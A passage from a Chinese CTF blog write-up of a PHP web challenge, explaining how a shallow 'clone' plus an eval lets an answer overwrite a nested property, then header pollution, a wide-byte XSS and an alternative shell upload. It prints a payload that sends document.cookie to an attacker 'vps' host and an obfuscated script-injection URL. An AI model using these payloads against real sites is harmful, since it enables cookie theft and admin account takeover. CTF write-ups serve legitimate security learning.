<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;answer&apos;]))&#123;</span><br><span class="line">    $answer = $_GET[&apos;answer&apos;];</span><br><span class="line">    $user-&gt;asker-&gt;answer($user, $answer);</span><br><span class="line">    if($user-&gt;url-&gt;referer != $user-&gt;url-&gt;page)&#123;</span><br><span class="line">        $user-&gt;url-&gt;location = $user-&gt;url-&gt;referer;</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;url-&gt;flag = True;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进到<code>answer()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Asker&#123; </span><br><span class="line">    function answer($user, $answer)&#123; </span><br><span class="line">        $this-&gt;user = clone $user; </span><br><span class="line">        if($this-&gt;right == $answer)&#123; </span><br><span class="line">            $this-&gt;message = &quot;clever man!&quot;; </span><br><span class="line">            return 1; </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            if(preg_match(&quot;/f|sy|(|)| |;|and|or|&amp;|\||\^|\$|#|\/|\*/&quot;, $answer))&#123; </span><br><span class="line">                eval(&quot;\$this-&gt;&quot;.$answer.&quot; = false;&quot;); </span><br><span class="line">                $this-&gt;updateList(); </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;message = &quot;what are you doing bro?&quot;; </span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;times ++; </span><br><span class="line">            return 0; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用了<code>clone</code>关键字复制了一份<code>user</code>，当回答错误时通过<code>eval()</code>将选项去除，问题就出在这里</p>
<p>php中<code>clone</code>这个关键字的有一个类似于原型链安全问题，只不过原型链是由上影响下，而<code>clone</code>的问题是由下影响上<br>通过<code>clone</code>这个关键字可以将一个变量直接赋值给另一个变量，某些情况下可以提高代码效率。但当原变量为一个类，而其中一个属性又为另一个类。当克隆变量修改了另一个类中的属性值时，就会导致原变量中，另一个类中的属性值也改变。简单的写一个例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class A&#123;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;a = new B();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;b = 222;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = clone $a;</span><br><span class="line"></span><br><span class="line">echo $a-&gt;a-&gt;b;</span><br><span class="line">$b-&gt;a-&gt;b = 999;</span><br><span class="line">echo $b-&gt;a-&gt;b;</span><br><span class="line">echo $a-&gt;a-&gt;b;</span><br></pre></td></tr></table></figure>
<p>这里的输出是<code>222999999</code>，变量a中属性a中属性b的值随着变量b的修改也改变了</p>
<p>回到题目上，<code>pre</code>是user类的url属性指向的类中的一个属性。于是就可以通过修改<code>$this-&gt;user-&gt;url-&gt;pre</code>的值，将<code>$user-&gt;url-&gt;pre</code>的值修改。将<code>answer</code>设为<code>user-&gt;url-&gt;pre</code>即可，这样就<code>$user-&gt;url-&gt;pre = False</code>，而<code>False</code>连接任意字符串都为其本身</p>
<p>然后就是控制<code>location</code><br>通过传入<code>referer</code>修改一次<code>referer</code>，再传入<code>referer</code>就可以将值赋给<code>location</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;answer&apos;]))&#123;</span><br><span class="line">    $answer = $_GET[&apos;answer&apos;];</span><br><span class="line">    $user-&gt;asker-&gt;answer($user, $answer);</span><br><span class="line">    if($user-&gt;url-&gt;referer != $user-&gt;url-&gt;page)&#123;</span><br><span class="line">        $user-&gt;url-&gt;location = $user-&gt;url-&gt;referer;</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;url-&gt;flag = True;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;referer&apos;]))&#123;</span><br><span class="line">    $referer = $_GET[&apos;referer&apos;];</span><br><span class="line">    if($referer != $user-&gt;url-&gt;page)&#123;</span><br><span class="line">        $user-&gt;url-&gt;referer = $referer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>于是先修改一波<code>referer</code><br><code>quit.php?referer=xxx</code><br>然后污染<code>header</code><br><code>quit.php?referer=Content-Type:text/html;charset=GBK;Referer:index&amp;answer=user-&gt;url-&gt;pre</code></p>
<p>污染后就可以进行宽字节XSS，先上传一个脚本<br><code>window.open(&#39;http://vps:port/?&#39;+document.cookie);</code><br><code>message</code>中其它的过滤用<code>String.fromCharCode()</code>绕过，script引入脚本<br><code>index.php?message=%df%27;var b = String.fromCharCode(115,99,114,105,112,116);var c = String.fromCharCode(49,46,119,97,118,101);x=document.createElement(b);x.src=c;document.body.appendChild(x);//</code><br>vps接到cookie后登上管理员账号，访问<code>teacher.php</code>算出md5提交即可得到flag</p>
<p>还有另一种简单的方法就是直接覆盖掉<code>black_list</code>，就可以直接上传shell了</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web/" rel="tag"># web</a>
          
            <a href="/tags/ctf/" rel="tag"># ctf</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/03/12/GYCTF2020-web-wp/" rel="next" title="GYCTF2020 web 复现">
                <i class="fa fa-chevron-left"></i> GYCTF2020 web 复现
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/04/05/在IDEA中使用MBean创建Spring项目/" rel="prev" title="在IDEA中使用MBean创建Spring项目">
                在IDEA中使用MBean创建Spring项目 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
            
              <p class="site-author-name" itemprop="name">k0t0r1</p>
              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-trick-gzmtu"><span class="nav-number">1.</span> <span class="nav-text">easy_trick_gzmtu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hardphp"><span class="nav-number">2.</span> <span class="nav-text">hardphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webct"><span class="nav-number">3.</span> <span class="nav-text">webct</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webtmp"><span class="nav-number">4.</span> <span class="nav-text">webtmp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hackme"><span class="nav-number">5.</span> <span class="nav-text">hackme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-java"><span class="nav-number">6.</span> <span class="nav-text">baby_java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmkq"><span class="nav-number">7.</span> <span class="nav-text">fmkq</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dooog"><span class="nav-number">8.</span> <span class="nav-text">dooog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nweb"><span class="nav-number">9.</span> <span class="nav-text">nweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GuessGame"><span class="nav-number">10.</span> <span class="nav-text">GuessGame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-UAF"><span class="nav-number">11.</span> <span class="nav-text">PHP-UAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlcheckin"><span class="nav-number">12.</span> <span class="nav-text">sqlcheckin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nothardweb"><span class="nav-number">13.</span> <span class="nav-text">nothardweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyweb"><span class="nav-number">14.</span> <span class="nav-text">easyweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#happyvacation"><span class="nav-number">15.</span> <span class="nav-text">happyvacation</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">k0t0r1</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  


  
  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  

</body>
</html>
